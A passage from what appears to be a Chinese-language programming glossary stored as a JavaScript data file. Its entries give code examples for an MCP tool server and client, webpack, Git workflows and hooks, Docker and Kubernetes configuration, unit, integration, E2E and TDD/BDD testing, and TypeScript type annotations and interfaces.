          path: {
            type: 'string',
            description: '文件路径'
          }
        },
        required: ['path']
      }
    }, this.readFile.bind(this));
  }

  async readFile(args) {
    try {
      const fs = require('fs').promises;
      const content = await fs.readFile(args.path, 'utf-8');

      return {
        content: [{
          type: 'text',
          text: content
        }]
      };
    } catch (error) {
      throw new Error(\`无法读取文件 \${args.path}: \${error.message}\`);
    }
  }
}

// MCP客户端使用示例
class MCPClient {
  constructor(serverUrl) {
    this.serverUrl = serverUrl;
    this.tools = new Map();
  }

  async connect() {
    const response = await fetch(\`\${this.serverUrl}/tools\`);
    const tools = await response.json();

    tools.forEach(tool => {
      this.tools.set(tool.name, tool);
    });
  }

  async callTool(toolName, args) {
    const response = await fetch(\`\${this.serverUrl}/tools/\${toolName}\`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });

    return await response.json();
  }
}`,
      useCases: ['AI工具集成', '外部数据访问', '安全API调用', '模型扩展'],
      relatedTerms: ['ai integration', 'tool calling', 'api protocol', 'model capabilities']
    }
  ],

  // 开发工具与环境 (40个术语)
  devtools: [
    {
      id: 'devtools_1',
      name: 'webpack',
      chinese: 'Webpack打包工具',
      description: '现代JavaScript应用程序的静态模块打包器，将模块及其依赖打包成静态资源',
      difficulty: 'intermediate',
      tags: ['bundling', 'build-tools', 'modules'],
      example: `// webpack.config.js
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');

module.exports = {
  mode: 'development', // 或 'production'

  entry: {
    main: './src/index.js',
    vendor: './src/vendor.js'
  },

  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].[contenthash].js',
    clean: true
  },

  module: {
    rules: [
      {
        test: /\.js$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
          options: {
            presets: ['@babel/preset-env', '@babel/preset-react']
          }
        }
      },
      {
        test: /\.css$/,
        use: [
          MiniCssExtractPlugin.loader,
          'css-loader',
          'postcss-loader'
        ]
      },
      {
        test: /\.scss$/,
        use: [
          MiniCssExtractPlugin.loader,
          'css-loader',
          'sass-loader'
        ]
      },
      {
        test: /\.(png|jpg|gif|svg)$/,
        type: 'asset/resource',
        generator: {
          filename: 'images/[name].[hash][ext]'
        }
      }
    ]
  },

  plugins: [
    new HtmlWebpackPlugin({
      template: './src/index.html',
      filename: 'index.html'
    }),
    new MiniCssExtractPlugin({
      filename: '[name].[contenthash].css'
    })
  ],

  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all'
        }
      }
    }
  },

  devServer: {
    contentBase: path.join(__dirname, 'dist'),
    port: 3000,
    hot: true,
    open: true
  }
};

// package.json scripts
{
  "scripts": {
    "dev": "webpack serve --mode development",
    "build": "webpack --mode production",
    "analyze": "webpack-bundle-analyzer dist/main.js"
  }
}`,
      useCases: ['模块打包', '代码分割', '资源优化', '开发服务器'],
      relatedTerms: ['babel', 'loaders', 'plugins', 'bundling']
    },
    {
      id: 'devtools_2',
      name: 'git_version_control',
      chinese: 'Git版本控制',
      description: '分布式版本控制系统，用于跟踪代码变更和团队协作',
      difficulty: 'beginner',
      tags: ['git', 'version-control', 'collaboration'],
      example: `// Git 基本命令和工作流

// 1. 仓库初始化和配置
/*
git init                          # 初始化新仓库
git clone <url>                   # 克隆远程仓库
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"
git config --list                # 查看配置
*/

// 2. 基本操作
/*
git status                        # 查看工作区状态
git add <file>                    # 添加文件到暂存区
git add .                         # 添加所有文件
git add -A                        # 添加所有变更
git commit -m "commit message"    # 提交变更
git commit -am "message"          # 添加并提交已跟踪文件
git log                           # 查看提交历史
git log --oneline                 # 简洁的提交历史
git log --graph --all             # 图形化显示分支
*/

// 3. 分支管理
/*
git branch                        # 查看本地分支
git branch -a                     # 查看所有分支
git branch <branch-name>          # 创建新分支
git checkout <branch-name>        # 切换分支
git checkout -b <branch-name>     # 创建并切换分支
git merge <branch-name>           # 合并分支
git branch -d <branch-name>       # 删除分支
git branch -D <branch-name>       # 强制删除分支
*/

// 4. 远程仓库操作
/*
git remote -v                     # 查看远程仓库
git remote add origin <url>       # 添加远程仓库
git push origin <branch>          # 推送到远程分支
git push -u origin main           # 推送并设置上游分支
git pull origin <branch>          # 拉取远程分支
git fetch origin                  # 获取远程更新
git push --tags                   # 推送标签
*/

// 5. 高级操作
/*
git stash                         # 暂存当前工作
git stash pop                     # 恢复暂存的工作
git stash list                    # 查看暂存列表
git reset --soft HEAD~1          # 软重置到上一个提交
git reset --hard HEAD~1          # 硬重置到上一个提交
git revert <commit-hash>          # 撤销指定提交
git cherry-pick <commit-hash>     # 挑选提交
git rebase <branch>               # 变基操作
git rebase -i HEAD~3              # 交互式变基
*/

// Git工作流示例

// Feature Branch 工作流
/*
# 1. 从主分支创建功能分支
git checkout main
git pull origin main
git checkout -b feature/user-authentication

# 2. 开发功能
git add .
git commit -m "Add user login functionality"
git commit -m "Add password validation"
git commit -m "Add user session management"

# 3. 推送功能分支
git push -u origin feature/user-authentication

# 4. 创建Pull Request/Merge Request
# (在GitHub/GitLab等平台上操作)

# 5. 合并后清理
git checkout main
git pull origin main
git branch -d feature/user-authentication
*/

// Gitflow 工作流
/*
# 初始化gitflow
git flow init

# 开始新功能
git flow feature start user-profile

# 完成功能
git flow feature finish user-profile

# 开始发布
git flow release start v1.2.0

# 完成发布
git flow release finish v1.2.0

# 紧急修复
git flow hotfix start critical-bug
git flow hotfix finish critical-bug
*/

// .gitignore 文件示例
/*
# 依赖目录
node_modules/
vendor/

# 构建输出
dist/
build/
*.min.js
*.min.css

# 环境配置
.env
.env.local
.env.production

# IDE文件
.vscode/
.idea/
*.swp
*.swo

# 操作系统文件
.DS_Store
Thumbs.db

# 日志文件
*.log
logs/

# 临时文件
tmp/
temp/
*.tmp

# 数据库文件
*.sqlite
*.db

# 编译文件
*.o
*.so
*.dylib
*.exe
*/

// Git Hooks 示例
// .git/hooks/pre-commit
/*
#!/bin/sh
# 提交前运行测试和代码检查

echo "Running pre-commit checks..."

# 运行ESLint
npm run lint
if [ $? -ne 0 ]; then
  echo "ESLint failed. Please fix the issues before committing."
  exit 1
fi

# 运行测试
npm test
if [ $? -ne 0 ]; then
  echo "Tests failed. Please fix the issues before committing."
  exit 1
fi

# 检查提交信息格式
commit_regex='^(feat|fix|docs|style|refactor|test|chore)(\(.+\))?: .{1,50}'
if ! grep -qE "$commit_regex" "$1"; then
  echo "Invalid commit message format. Please use: type(scope): description"
  exit 1
fi

echo "Pre-commit checks passed!"
*/

// 使用Husky管理Git Hooks
// package.json
/*
{
  "husky": {
    "hooks": {
      "pre-commit": "lint-staged",
      "commit-msg": "commitlint -E HUSKY_GIT_PARAMS",
      "pre-push": "npm test"
    }
  },
  "lint-staged": {
    "*.{js,jsx,ts,tsx}": [
      "eslint --fix",
      "prettier --write",
      "git add"
    ],
    "*.{css,scss,less}": [
      "stylelint --fix",
      "prettier --write",
      "git add"
    ]
  }
}
*/

// 提交信息规范 (Conventional Commits)
/*
feat: add user authentication system
fix: resolve memory leak in data processing
docs: update API documentation
style: format code with prettier
refactor: restructure user service
test: add unit tests for payment module
chore: update dependencies

# 带作用域
feat(auth): implement OAuth2 integration
fix(ui): correct button alignment issue
docs(api): add endpoint documentation

# 破坏性变更
feat!: change API response format
feat(api)!: remove deprecated endpoints

BREAKING CHANGE: The API response format has changed.
Old format: { data: {...} }
New format: { result: {...}, meta: {...} }
*/`,
      useCases: ['版本控制', '团队协作', '代码历史', '分支管理'],
      relatedTerms: ['version control', 'branching', 'merging', 'collaboration']
    },
    {
      id: 'devtools_3',
      name: 'docker_containerization',
      chinese: 'Docker容器化',
      description: '轻量级虚拟化技术，将应用及其依赖打包到可移植的容器中',
      difficulty: 'intermediate',
      tags: ['docker', 'containerization', 'deployment'],
      example: `// Dockerfile 示例
/*
# 多阶段构建的Node.js应用
FROM node:18-alpine AS builder

# 设置工作目录
WORKDIR /app

# 复制package文件
COPY package*.json ./

# 安装依赖
RUN npm ci --only=production

# 复制源代码
COPY . .

# 构建应用
RUN npm run build

# 生产阶段
FROM node:18-alpine AS production

# 创建非root用户
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nextjs -u 1001

# 设置工作目录
WORKDIR /app

# 复制构建产物
COPY --from=builder --chown=nextjs:nodejs /app/dist ./dist
COPY --from=builder --chown=nextjs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nextjs:nodejs /app/package.json ./package.json

# 切换到非root用户
USER nextjs

# 暴露端口
EXPOSE 3000

# 健康检查
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD curl -f http://localhost:3000/health || exit 1

# 启动命令
CMD ["npm", "start"]
*/

// Docker Compose 配置
/*
version: '3.8'

services:
  # Web应用
  web:
    build:
      context: .
      dockerfile: Dockerfile
      target: production
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - DATABASE_URL=postgresql://postgres:password@db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    volumes:
      - ./uploads:/app/uploads
    networks:
      - app-network
    restart: unless-stopped
    deploy:
      replicas: 2
      resources:
        limits:
          cpus: '0.5'
          memory: 512M

  # 数据库
  db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=password
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network
    restart: unless-stopped

  # Redis缓存
  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes
    volumes:
      - redis_data:/data
    networks:
      - app-network
    restart: unless-stopped

  # Nginx反向代理
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./ssl:/etc/nginx/ssl
    depends_on:
      - web
    networks:
      - app-network
    restart: unless-stopped

volumes:
  postgres_data:
  redis_data:

networks:
  app-network:
    driver: bridge
*/

// Docker 常用命令
/*
# 镜像操作
docker build -t myapp:latest .          # 构建镜像
docker images                           # 查看镜像列表
docker rmi <image-id>                   # 删除镜像
docker pull nginx:alpine                # 拉取镜像
docker push myapp:latest                # 推送镜像

# 容器操作
docker run -d -p 3000:3000 myapp:latest # 运行容器
docker ps                               # 查看运行中的容器
docker ps -a                            # 查看所有容器
docker stop <container-id>              # 停止容器
docker start <container-id>             # 启动容器
docker restart <container-id>           # 重启容器
docker rm <container-id>                # 删除容器
docker logs <container-id>              # 查看容器日志
docker exec -it <container-id> /bin/sh  # 进入容器

# Docker Compose操作
docker-compose up -d                    # 启动服务
docker-compose down                     # 停止服务
docker-compose logs                     # 查看日志
docker-compose ps                       # 查看服务状态
docker-compose build                    # 构建服务
docker-compose pull                     # 拉取镜像

# 清理操作
docker system prune                     # 清理未使用的资源
docker volume prune                     # 清理未使用的卷
docker network prune                    # 清理未使用的网络
*/

// .dockerignore 文件
/*
node_modules
npm-debug.log
.git
.gitignore
README.md
.env
.nyc_output
coverage
.vscode
.idea
*.log
dist
build
.DS_Store
Thumbs.db
*/

// 生产环境优化
/*
# 多阶段构建优化
FROM node:18-alpine AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force

FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM node:18-alpine AS runner
WORKDIR /app
ENV NODE_ENV production

RUN addgroup -g 1001 -S nodejs
RUN adduser -S nextjs -u 1001

COPY --from=deps --chown=nextjs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nextjs:nodejs /app/dist ./dist
COPY --from=builder --chown=nextjs:nodejs /app/public ./public
COPY --from=builder --chown=nextjs:nodejs /app/package.json ./package.json

USER nextjs

EXPOSE 3000
ENV PORT 3000

CMD ["npm", "start"]
*/

// Kubernetes部署配置
/*
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp-deployment
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: myapp
        image: myapp:latest
        ports:
        - containerPort: 3000
        env:
        - name: NODE_ENV
          value: "production"
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: app-secrets
              key: database-url
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /health
            port: 3000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 3000
          initialDelaySeconds: 5
          periodSeconds: 5
---
apiVersion: v1
kind: Service
metadata:
  name: myapp-service
spec:
  selector:
    app: myapp
  ports:
  - port: 80
    targetPort: 3000
  type: LoadBalancer
*/`,
      useCases: ['应用部署', '环境一致性', '微服务', '持续集成'],
      relatedTerms: ['containerization', 'orchestration', 'kubernetes', 'deployment']
    }
  ],

  // 测试与质量保证 (35个术语)
  testing: [
    {
      id: 'testing_1',
      name: 'unit_testing',
      chinese: '单元测试',
      description: '对软件中最小可测试单元进行检查和验证的测试方法',
      difficulty: 'beginner',
      tags: ['testing', 'quality', 'automation'],
      example: `// Jest单元测试示例
// math.js
function add(a, b) {
  return a + b;
}

function multiply(a, b) {
  return a * b;
}

function divide(a, b) {
  if (b === 0) {
    throw new Error('Division by zero');
  }
  return a / b;
}

module.exports = { add, multiply, divide };

// math.test.js
const { add, multiply, divide } = require('./math');

describe('Math functions', () => {
  describe('add', () => {
    test('should add two positive numbers', () => {
      expect(add(2, 3)).toBe(5);
    });

    test('should add negative numbers', () => {
      expect(add(-2, -3)).toBe(-5);
    });

    test('should handle zero', () => {
      expect(add(5, 0)).toBe(5);
    });
  });

  describe('multiply', () => {
    test('should multiply two numbers', () => {
      expect(multiply(3, 4)).toBe(12);
    });

    test('should handle zero multiplication', () => {
      expect(multiply(5, 0)).toBe(0);
    });
  });

  describe('divide', () => {
    test('should divide two numbers', () => {
      expect(divide(10, 2)).toBe(5);
    });

    test('should throw error when dividing by zero', () => {
      expect(() => divide(10, 0)).toThrow('Division by zero');
    });
  });
});

// React组件测试
import React from 'react';
import { render, screen, fireEvent } from '@testing-library/react';
import '@testing-library/jest-dom';
import Counter from './Counter';

describe('Counter Component', () => {
  test('renders initial count', () => {
    render(<Counter initialCount={0} />);
    expect(screen.getByText('Count: 0')).toBeInTheDocument();
  });

  test('increments count when button is clicked', () => {
    render(<Counter initialCount={0} />);
    const incrementButton = screen.getByText('Increment');

    fireEvent.click(incrementButton);
    expect(screen.getByText('Count: 1')).toBeInTheDocument();
  });

  test('decrements count when button is clicked', () => {
    render(<Counter initialCount={5} />);
    const decrementButton = screen.getByText('Decrement');

    fireEvent.click(decrementButton);
    expect(screen.getByText('Count: 4')).toBeInTheDocument();
  });
});`,
      useCases: ['代码质量保证', '回归测试', '重构支持', '文档说明'],
      relatedTerms: ['integration testing', 'tdd', 'jest', 'mocking']
    },
    {
      id: 'testing_2',
      name: 'integration_testing',
      chinese: '集成测试',
      description: '测试多个组件或服务之间交互的测试方法',
      difficulty: 'intermediate',
      tags: ['testing', 'integration', 'api'],
      example: `// API集成测试示例
const request = require('supertest');
const app = require('../app');
const { setupTestDB, cleanupTestDB } = require('./helpers/database');

describe('User API Integration Tests', () => {
  let server;
  let testUser;

  beforeAll(async () => {
    await setupTestDB();
    server = app.listen(0); // 使用随机端口
  });

  afterAll(async () => {
    await cleanupTestDB();
    await server.close();
  });

  beforeEach(async () => {
    // 创建测试用户
    testUser = {
      email: 'test@example.com',
      password: 'password123',
      name: 'Test User'
    };
  });

  describe('POST /api/users', () => {
    test('should create a new user', async () => {
      const response = await request(server)
        .post('/api/users')
        .send(testUser)
        .expect(201);

      expect(response.body).toMatchObject({
        id: expect.any(Number),
        email: testUser.email,
        name: testUser.name
      });
      expect(response.body.password).toBeUndefined();
    });

    test('should return 400 for invalid email', async () => {
      const invalidUser = { ...testUser, email: 'invalid-email' };

      const response = await request(server)
        .post('/api/users')
        .send(invalidUser)
        .expect(400);

      expect(response.body.error).toContain('Invalid email');
    });

    test('should return 409 for duplicate email', async () => {
      // 先创建一个用户
      await request(server)
        .post('/api/users')
        .send(testUser)
        .expect(201);

      // 尝试创建相同邮箱的用户
      const response = await request(server)
        .post('/api/users')
        .send(testUser)
        .expect(409);

      expect(response.body.error).toContain('Email already exists');
    });
  });

  describe('Authentication Flow', () => {
    let userId;
    let authToken;

    beforeEach(async () => {
      // 创建用户
      const createResponse = await request(server)
        .post('/api/users')
        .send(testUser);

      userId = createResponse.body.id;
    });

    test('should authenticate user with valid credentials', async () => {
      const response = await request(server)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        })
        .expect(200);

      expect(response.body).toMatchObject({
        token: expect.any(String),
        user: {
          id: userId,
          email: testUser.email,
          name: testUser.name
        }
      });

      authToken = response.body.token;
    });

    test('should access protected route with valid token', async () => {
      // 先登录获取token
      const loginResponse = await request(server)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });

      authToken = loginResponse.body.token;

      // 访问受保护的路由
      const response = await request(server)
        .get('/api/users/profile')
        .set('Authorization', \`Bearer \${authToken}\`)
        .expect(200);

      expect(response.body).toMatchObject({
        id: userId,
        email: testUser.email,
        name: testUser.name
      });
    });

    test('should reject access without token', async () => {
      await request(server)
        .get('/api/users/profile')
        .expect(401);
    });
  });
});

// 数据库集成测试
const { MongoMemoryServer } = require('mongodb-memory-server');
const mongoose = require('mongoose');
const User = require('../models/User');

describe('User Model Integration Tests', () => {
  let mongoServer;

  beforeAll(async () => {
    mongoServer = await MongoMemoryServer.create();
    const mongoUri = mongoServer.getUri();
    await mongoose.connect(mongoUri);
  });

  afterAll(async () => {
    await mongoose.disconnect();
    await mongoServer.stop();
  });

  beforeEach(async () => {
    await User.deleteMany({});
  });

  test('should save user to database', async () => {
    const userData = {
      email: 'test@example.com',
      password: 'hashedpassword',
      name: 'Test User'
    };

    const user = new User(userData);
    const savedUser = await user.save();

    expect(savedUser._id).toBeDefined();
    expect(savedUser.email).toBe(userData.email);
    expect(savedUser.createdAt).toBeDefined();
  });

  test('should enforce unique email constraint', async () => {
    const userData = {
      email: 'test@example.com',
      password: 'hashedpassword',
      name: 'Test User'
    };

    await new User(userData).save();

    // 尝试保存相同邮箱的用户
    const duplicateUser = new User(userData);

    await expect(duplicateUser.save()).rejects.toThrow();
  });
});

// 外部服务集成测试
const nock = require('nock');

describe('External API Integration Tests', () => {
  afterEach(() => {
    nock.cleanAll();
  });

  test('should handle successful payment processing', async () => {
    // Mock外部支付API
    nock('https://api.stripe.com')
      .post('/v1/charges')
      .reply(200, {
        id: 'ch_test_123',
        status: 'succeeded',
        amount: 2000
      });

    const paymentData = {
      amount: 2000,
      currency: 'usd',
      source: 'tok_visa'
    };

    const response = await request(server)
      .post('/api/payments')
      .send(paymentData)
      .expect(200);

    expect(response.body).toMatchObject({
      success: true,
      chargeId: 'ch_test_123'
    });
  });

  test('should handle payment API failure', async () => {
    // Mock外部API失败
    nock('https://api.stripe.com')
      .post('/v1/charges')
      .reply(400, {
        error: {
          message: 'Your card was declined.'
        }
      });

    const paymentData = {
      amount: 2000,
      currency: 'usd',
      source: 'tok_chargeDeclined'
    };

    const response = await request(server)
      .post('/api/payments')
      .send(paymentData)
      .expect(400);

    expect(response.body.error).toContain('declined');
  });
});

// 端到端测试 (E2E)
const puppeteer = require('puppeteer');

describe('E2E User Registration Flow', () => {
  let browser;
  let page;

  beforeAll(async () => {
    browser = await puppeteer.launch({
      headless: process.env.CI === 'true',
      slowMo: 50
    });
  });

  afterAll(async () => {
    await browser.close();
  });

  beforeEach(async () => {
    page = await browser.newPage();
    await page.goto('http://localhost:3000');
  });

  afterEach(async () => {
    await page.close();
  });

  test('should complete user registration flow', async () => {
    // 导航到注册页面
    await page.click('[data-testid="register-link"]');
    await page.waitForSelector('[data-testid="register-form"]');

    // 填写注册表单
    await page.type('[data-testid="email-input"]', 'test@example.com');
    await page.type('[data-testid="password-input"]', 'password123');
    await page.type('[data-testid="name-input"]', 'Test User');

    // 提交表单
    await page.click('[data-testid="register-button"]');

    // 等待重定向到仪表板
    await page.waitForNavigation();
    expect(page.url()).toContain('/dashboard');

    // 验证用户信息显示
    const welcomeMessage = await page.textContent('[data-testid="welcome-message"]');
    expect(welcomeMessage).toContain('Welcome, Test User');
  });

  test('should show validation errors for invalid input', async () => {
    await page.click('[data-testid="register-link"]');
    await page.waitForSelector('[data-testid="register-form"]');

    // 提交空表单
    await page.click('[data-testid="register-button"]');

    // 检查错误消息
    const emailError = await page.textContent('[data-testid="email-error"]');
    const passwordError = await page.textContent('[data-testid="password-error"]');

    expect(emailError).toContain('Email is required');
    expect(passwordError).toContain('Password is required');
  });
});`,
      useCases: ['API测试', '数据库测试', '服务集成', '端到端测试'],
      relatedTerms: ['api testing', 'database testing', 'mocking', 'e2e testing']
    },
    {
      id: 'testing_3',
      name: 'tdd_bdd',
      chinese: '测试驱动开发',
      description: '先写测试再写代码的开发方法，确保代码质量和需求覆盖',
      difficulty: 'intermediate',
      tags: ['tdd', 'bdd', 'methodology'],
      example: `// TDD (Test-Driven Development) 示例

// 第一步：编写失败的测试
describe('Calculator', () => {
  test('should add two numbers correctly', () => {
    const calculator = new Calculator();
    const result = calculator.add(2, 3);
    expect(result).toBe(5);
  });

  test('should subtract two numbers correctly', () => {
    const calculator = new Calculator();
    const result = calculator.subtract(5, 3);
    expect(result).toBe(2);
  });

  test('should multiply two numbers correctly', () => {
    const calculator = new Calculator();
    const result = calculator.multiply(4, 3);
    expect(result).toBe(12);
  });

  test('should divide two numbers correctly', () => {
    const calculator = new Calculator();
    const result = calculator.divide(10, 2);
    expect(result).toBe(5);
  });

  test('should throw error when dividing by zero', () => {
    const calculator = new Calculator();
    expect(() => calculator.divide(10, 0)).toThrow('Division by zero');
  });
});

// 第二步：编写最小可行代码
class Calculator {
  add(a, b) {
    return a + b;
  }

  subtract(a, b) {
    return a - b;
  }

  multiply(a, b) {
    return a * b;
  }

  divide(a, b) {
    if (b === 0) {
      throw new Error('Division by zero');
    }
    return a / b;
  }
}

// 第三步：重构代码
class Calculator {
  constructor() {
    this.history = [];
  }

  add(a, b) {
    const result = this._validateAndCalculate(a, b, (x, y) => x + y);
    this._recordOperation('add', a, b, result);
    return result;
  }

  subtract(a, b) {
    const result = this._validateAndCalculate(a, b, (x, y) => x - y);
    this._recordOperation('subtract', a, b, result);
    return result;
  }

  multiply(a, b) {
    const result = this._validateAndCalculate(a, b, (x, y) => x * y);
    this._recordOperation('multiply', a, b, result);
    return result;
  }

  divide(a, b) {
    if (b === 0) {
      throw new Error('Division by zero');
    }
    const result = this._validateAndCalculate(a, b, (x, y) => x / y);
    this._recordOperation('divide', a, b, result);
    return result;
  }

  getHistory() {
    return this.history;
  }

  clear() {
    this.history = [];
  }

  _validateAndCalculate(a, b, operation) {
    if (typeof a !== 'number' || typeof b !== 'number') {
      throw new Error('Both arguments must be numbers');
    }
    return operation(a, b);
  }

  _recordOperation(operation, a, b, result) {
    this.history.push({
      operation,
      operands: [a, b],
      result,
      timestamp: new Date()
    });
  }
}

// BDD (Behavior-Driven Development) 示例
// 使用Cucumber/Gherkin语法

/*
Feature: User Authentication
  As a user
  I want to be able to log in to the system
  So that I can access my personal dashboard

  Scenario: Successful login with valid credentials
    Given I am on the login page
    When I enter valid email "user@example.com"
    And I enter valid password "password123"
    And I click the login button
    Then I should be redirected to the dashboard
    And I should see a welcome message

  Scenario: Failed login with invalid credentials
    Given I am on the login page
    When I enter invalid email "wrong@example.com"
    And I enter invalid password "wrongpassword"
    And I click the login button
    Then I should see an error message "Invalid credentials"
    And I should remain on the login page

  Scenario: Login form validation
    Given I am on the login page
    When I leave the email field empty
    And I leave the password field empty
    And I click the login button
    Then I should see validation errors
    And the login button should be disabled
*/

// BDD步骤定义 (Step Definitions)
const { Given, When, Then } = require('@cucumber/cucumber');
const { expect } = require('@playwright/test');

Given('I am on the login page', async function () {
  await this.page.goto('/login');
});

When('I enter valid email {string}', async function (email) {
  await this.page.fill('[data-testid="email-input"]', email);
});

When('I enter valid password {string}', async function (password) {
  await this.page.fill('[data-testid="password-input"]', password);
});

When('I click the login button', async function () {
  await this.page.click('[data-testid="login-button"]');
});

Then('I should be redirected to the dashboard', async function () {
  await this.page.waitForURL('/dashboard');
  expect(this.page.url()).toContain('/dashboard');
});

Then('I should see a welcome message', async function () {
  const welcomeMessage = await this.page.textContent('[data-testid="welcome-message"]');
  expect(welcomeMessage).toContain('Welcome');
});

// Jest BDD风格测试
describe('User Management System', () => {
  describe('Given a new user wants to register', () => {
    describe('When they provide valid information', () => {
      test('Then they should be successfully registered', async () => {
        const userService = new UserService();
        const userData = {
          email: 'newuser@example.com',
          password: 'securepassword',
          name: 'New User'
        };

        const result = await userService.register(userData);

        expect(result.success).toBe(true);
        expect(result.user.email).toBe(userData.email);
        expect(result.user.id).toBeDefined();
      });
    });

    describe('When they provide invalid email', () => {
      test('Then registration should fail with validation error', async () => {
        const userService = new UserService();
        const userData = {
          email: 'invalid-email',
          password: 'securepassword',
          name: 'New User'
        };

        await expect(userService.register(userData))
          .rejects.toThrow('Invalid email format');
      });
    });
  });

  describe('Given an existing user wants to login', () => {
    let existingUser;

    beforeEach(async () => {
      const userService = new UserService();
      existingUser = await userService.register({
        email: 'existing@example.com',
        password: 'password123',
        name: 'Existing User'
      });
    });

    describe('When they provide correct credentials', () => {
      test('Then they should be successfully authenticated', async () => {
        const authService = new AuthService();

        const result = await authService.login(
          'existing@example.com',
          'password123'
        );

        expect(result.success).toBe(true);
        expect(result.token).toBeDefined();
        expect(result.user.email).toBe('existing@example.com');
      });
    });

    describe('When they provide incorrect password', () => {
      test('Then authentication should fail', async () => {
        const authService = new AuthService();

        await expect(authService.login(
          'existing@example.com',
          'wrongpassword'
        )).rejects.toThrow('Invalid credentials');
      });
    });
  });
});

// 测试金字塔实现
// 1. 单元测试 (70%)
describe('Unit Tests - Password Validator', () => {
  test('should validate strong password', () => {
    expect(PasswordValidator.isStrong('StrongP@ss123')).toBe(true);
  });

  test('should reject weak password', () => {
    expect(PasswordValidator.isStrong('weak')).toBe(false);
  });
});

// 2. 集成测试 (20%)
describe('Integration Tests - User Registration', () => {
  test('should register user and send welcome email', async () => {
    const result = await userService.register(validUserData);
    expect(result.success).toBe(true);
    expect(emailService.sendWelcomeEmail).toHaveBeenCalled();
  });
});

// 3. E2E测试 (10%)
describe('E2E Tests - Complete User Journey', () => {
  test('should complete full registration and login flow', async () => {
    await page.goto('/register');
    await page.fill('[data-testid="email"]', 'test@example.com');
    await page.fill('[data-testid="password"]', 'StrongP@ss123');
    await page.click('[data-testid="register-button"]');

    await page.waitForURL('/dashboard');
    expect(page.url()).toContain('/dashboard');
  });
});`,
      useCases: ['质量保证', '需求验证', '重构安全', '文档化'],
      relatedTerms: ['red-green-refactor', 'behavior specification', 'acceptance criteria', 'test pyramid']
    }
  ],

  // TypeScript (30个术语)
  typescript: [
    {
      id: 'ts_1',
      name: 'type_annotations',
      chinese: '类型注解',
      description: 'TypeScript中为变量、函数参数和返回值指定类型的语法',
      difficulty: 'beginner',
      tags: ['types', 'annotations', 'static-typing'],
      example: `// 基本类型注解
let name: string = 'Alice';
let age: number = 25;
let isActive: boolean = true;
let items: string[] = ['apple', 'banana', 'orange'];
let coordinates: [number, number] = [10, 20];

// 函数类型注解
function greet(name: string): string {
  return \`Hello, \${name}!\`;
}

function add(a: number, b: number): number {
  return a + b;
}

function processUser(user: { name: string; age: number }): void {
  console.log(\`Processing user: \${user.name}, age: \${user.age}\`);
}

// 可选参数和默认参数
function createUser(name: string, age?: number, isAdmin: boolean = false): User {
  return {
    name,
    age: age || 0,
    isAdmin
  };
}

// 联合类型
let id: string | number = 'user123';
id = 42; // 也是有效的

function formatId(id: string | number): string {
  if (typeof id === 'string') {
    return id.toUpperCase();
  }
  return id.toString();
}

// 数组类型的不同写法
let numbers1: number[] = [1, 2, 3];
let numbers2: Array<number> = [1, 2, 3];

// 对象类型
let user: {
  name: string;
  age: number;
  email?: string; // 可选属性
  readonly id: number; // 只读属性
} = {
  name: 'Alice',
  age: 25,
  id: 1
};

// 函数类型
let calculate: (a: number, b: number) => number;
calculate = (x, y) => x + y;

// 泛型函数
function identity<T>(arg: T): T {
  return arg;
}

let stringIdentity = identity<string>('hello');
let numberIdentity = identity<number>(42);

// 类型断言
let someValue: unknown = 'this is a string';
let strLength: number = (someValue as string).length;
// 或者使用尖括号语法（在JSX中不推荐）
let strLength2: number = (<string>someValue).length;`,
      useCases: ['类型安全', '代码提示', '错误检查', '重构支持'],
      relatedTerms: ['static typing', 'type checking', 'intellisense', 'compile time']
    },
    {
      id: 'ts_2',
      name: 'interfaces',
      chinese: '接口',
      description: '定义对象结构和契约的TypeScript特性，用于类型检查和代码组织',
      difficulty: 'beginner',
      tags: ['interfaces', 'contracts', 'structure'],
      example: `// 基本接口定义
interface User {
  id: number;
  name: string;
  email: string;
  age?: number; // 可选属性
  readonly createdAt: Date; // 只读属性
}

// 使用接口
const user: User = {
  id: 1,
  name: 'Alice',
  email: 'alice@example.com',
  createdAt: new Date()
};

// 函数接口
interface CalculatorFunction {
  (a: number, b: number): number;
}

const add: CalculatorFunction = (x, y) => x + y;
const multiply: CalculatorFunction = (x, y) => x * y;

// 方法接口
interface UserService {
  getUser(id: number): Promise<User>;
  createUser(userData: Omit<User, 'id' | 'createdAt'>): Promise<User>;
